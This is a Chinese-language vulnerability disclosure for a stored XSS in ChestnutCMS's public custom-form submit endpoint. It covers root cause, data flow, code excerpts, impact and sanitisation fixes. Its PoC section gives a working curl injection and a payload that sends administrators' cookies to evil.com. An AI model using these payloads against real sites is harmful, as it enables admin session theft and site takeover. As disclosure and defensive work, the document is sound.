# CAN-2026-2031969：ChestnutCMS 自定义表单存储型跨站脚本（Stored XSS）漏洞

> **漏洞标识**：CAN-2026-2031969（CVE 候选编号）
> **报告日期**：2026-06-16
> **报告语言**：简体中文（English version: [README.md](./README.md)）

---

## 一、漏洞标识

| 项目 | 内容 |
|---|---|
| 漏洞编号 | CAN-2026-2031969（CVE 候选） |
| 漏洞类型 | 存储型跨站脚本 Stored XSS（CWE-79） |
| 受影响产品 | ChestnutCMS（栗子 CMS） |
| 受影响版本 | `<= 1.5.13`（master 分支，截至 V1.5.13） |
| 修复版本 | 无（截至披露日未发现官方修复） |
| 漏洞接口 | `POST /api/customform/submit` |
| 漏洞组件 | `CustomFormApiController#submitForm` |
| CVSS 3.1 | **9.6 Critical** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L` |
| 利用前提 | 公开接口；**仅需表单 formId**（自定义表单默认不启用登录认证与验证码） |

---

## 二、漏洞概述（CVE 标准描述）

ChestnutCMS 的自定义表单数据提交接口 `POST /api/customform/submit`（`CustomFormApiController.submitForm`）存在存储型跨站脚本漏洞。当表单包含富文本字段（`controlType='UEditor'`）时，后端在保存数据的过程中对富文本内容**未进行任何 HTML 过滤或 XSS 防护**（`CustomFormApiServiceImpl` → `ModelDataServiceImpl#saveModelData`，富文本字段处理器仅做字符串转换），恶意脚本被原样持久化到数据库。管理员在后台「自定义表单数据」页面查看富文本字段时，前端 `data.vue` 使用 `v-html` 指令直接渲染该内容，导致攻击者注入的脚本在管理员浏览器上下文中执行。

自定义表单在创建时虽可配置「是否需要登录」与「是否启用验证码」，但**默认均为关闭**；且该表单本身即作为问卷、报名等场景**对外分发**，表单 `formId` 属正常使用流程中可获取的信息。因此**未认证的远程攻击者仅需获知 `formId`**，即可提交携带恶意脚本的表单数据，进而窃取管理员会话凭据（Cookie / Token）、劫持管理后台，造成机密性与完整性受损；结合后台权限可进一步导致越权与代码执行风险。

---

## 三、受影响版本

- **受影响**：ChestnutCMS `<= V1.5.13`（master 分支 HEAD = `ddb77bae`）。
- **不受影响**：暂无（截至披露日未发现已修复版本）。

---

## 四、漏洞详情

### 4.1 根因

- **后端无净化**：富文本字段处理器 `MetaControlType_UEditor.valueAsString()` 仅做简单字符串转换，未实现任何标签 / 事件过滤；数据经 `saveModelData` 原样落库。
- **前端不安全渲染**：`data.vue:87` 使用 `v-html` 直接渲染数据库内容。

### 4.2 数据流（Source → Sink）

```
POST /api/customform/submit
  └─ formData（富文本字段，攻击者完全可控）            [Source]
     └─ CustomFormApiController.submitForm()
        └─ CustomFormApiServiceImpl.submit()           （无过滤）
           └─ ModelDataServiceImpl.saveModelData()     （持久化，无过滤）
              └─ MetaControlType_UEditor.valueAsString()（无过滤）
                 └─ 数据库存储
                    └─ 管理员后台 data.vue:87  v-html   [Sink：脚本执行]
```

### 4.3 关键代码证据

**后端入口**（`CustomFormApiController.java`）：

```java
@PostMapping("/submit")
public R<Void> submitForm(@RequestBody Map<String, Object> formData, HttpServletRequest request) {
    // ... formId / captcha(可选) / uuid 等校验
    customFormApiService.submit(form, formData);  // 直接提交，无 HTML 过滤
    return R.ok();
}
```

**后端保存逻辑**（`CustomFormApiServiceImpl.java`）：

```java
// 仅处理 base64 图片，随后原样保存
this.modelDataService.saveModelData(form.getModelId(), formData);  // 无 HTML 过滤
```

**字段值处理**（`ModelDataServiceImpl.java`）：

```java
IMetaControlType controlType = getControlType(field.getControlType());
if (Objects.nonNull(fieldValue)) {
    fieldValue = controlType.valueAsString(fieldValue);  // UEditor 类型仅做字符串转换，无过滤
}
```

**前端 Sink**（`data.vue:87`）：

```vue
<div class="rich-content" v-html="scope.row[field.code]"></div>
```

---

## 五、PoC 摘要

### 5.1 前置准备：获取 `formId`

1. 以管理员登录后台 → **「互动运营 → 自定义表单」**；
2. 新建一个自定义表单，并为其新增一个**富文本（UEditor）类型**字段（如字段 code 记为 `content`）；
3. 该表单的 `formId`即为利用所需参数（如 `formId=1`）。
4. 保持表单「是否需要登录」「是否启用验证码」为**默认关闭**状态即可快速复现。

> 表单发布后本就会作为问卷对外暴露，`formId` 属正常可获取信息，攻击门槛极低。

### 5.2 利用命令

完整自动化验证脚本见 [`poc_customform_xss.py`](./poc_customform_xss.py)（默认假设表单未启用验证码与登录，与系统默认配置一致）：

```bash
python poc_customform_xss.py -t http://target -f 1 -F content
# 自定义载荷（外带 Cookie）：
python poc_customform_xss.py -t http://target -f 1 -F content \
    -p '<img src=x onerror=fetch("https://evil.com/c?"+document.cookie)>'
```

等价的 `curl` 最小请求（`cc-uuid` 可任意取值，仅作会话标识，默认不校验）：

```bash
curl -X POST 'http://target/api/customform/submit' \
  -H 'Content-Type: application/json' \
  -H 'cc-uuid: 123' \
  -d '{"formId": 1, "content": "<img src=x onerror=alert(document.cookie)>"}'
```

**触发**：管理员登录后台 →「CMS → 自定义表单 → 数据管理（formId=1）」→ `onerror` 中的 JavaScript 在管理员浏览器执行。

**判定成功的标志**：

- 接口返回 `{"code":200,"msg":"操作成功"}`，恶意内容已写入数据库；
- 攻击者控制的服务器收到包含管理员 Cookie 的请求；或改用 `alert(document.cookie)` 观察弹窗。

### 5.3 验证录像

- [ ] **步骤 1**：后台「互动运营 → 自定义表单」创建表单并新增 UEditor 富文本字段，记录 `formId`
- [ ] **步骤 2**：执行 PoC 提交恶意载荷，接口返回 `code:200`
- [ ] **步骤 3**：管理员后台查看该富文本字段，XSS 触发（弹窗 / 外带请求命中）

<video src="chestnutCMS_XSS_CAN-2026-2031969.mp4"></video>

---

## 六、影响

- 窃取管理员会话凭据（Cookie / Token），**劫持管理后台**；
- 以管理员身份执行任意后台操作（数据篡改、账号接管、站点挂马）；
- 结合后台已有高危功能（如代码生成、模板导入、脚本执行等）可进一步导致远程代码执行（RCE）。

---

## 七、缓解与修复建议

1. **后端净化（首选）**：在持久化前对富文本字段统一做 HTML 过滤，推荐使用 **OWASP Java HtmlSanitizer** 或 **Jsoup `Safelist`**，仅允许安全标签与属性。
2. **前端净化**：渲染前使用 **DOMPurify** 清洗，避免对不可信数据直接使用 `v-html`。
3. **纵深防御**：
   - 部署严格的 **Content-Security-Policy**（禁用内联脚本，采用 nonce/hash）；
   - 为会话 Cookie 启用 `HttpOnly` + `SameSite`；
   - 在 `IMetaControlType` 接口层面约定 `sanitize()` 契约，所有富文本控件类型强制实现。

---

## 八、参考

- 完整 PoC 脚本：[`poc_customform_xss.py`](./poc_customform_xss.py)
- CWE-79：Improper Neutralization of Input During Web Page Generation — https://cwe.mitre.org/data/definitions/79.html
